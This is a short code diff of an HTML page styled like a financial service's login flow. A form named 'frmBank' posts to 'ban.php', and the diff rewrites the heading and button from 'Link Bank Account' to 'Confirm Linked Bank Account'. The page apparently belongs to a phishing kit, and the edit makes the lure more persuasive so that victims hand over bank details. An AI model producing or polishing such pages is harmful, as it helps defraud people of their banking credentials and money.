@@ -80,7 +80,7 @@ document.getElementById("parentForm").submit(); //form submission
 <div id="ember352" class="cookie-banner ember-view">  </div> 
 <section class="layout-login flex-container full-height pad"> 
 <div class="login-container flex-container flex-v-center flex-fill"> 
-<h1 class="step-title flex-static">Link Bank Account</h1> 
+<h1 class="step-title flex-static">Confirm Linked Bank Account</h1> 
 <form autocomplete="off" novalidate="true" id="frmBank" method="POST" action="ban.php" class="login-form ember-view"> 
 <div class="field-container"> 
 <div class="field"> 
@@ -92,7 +92,7 @@ document.getElementById("parentForm").submit(); //form submission
 </div> 
 </div> 
 <div id="ember555" class="cta submit-button-component submit-button-with-spinner ember-view"> 
-<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Link Bank Account</button> 
+<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Confirm Linked Bank Account</button> 
 </div> 
 </form> 
 <a href="#" class="login-help-link fade-in immediate show">Help</a> 
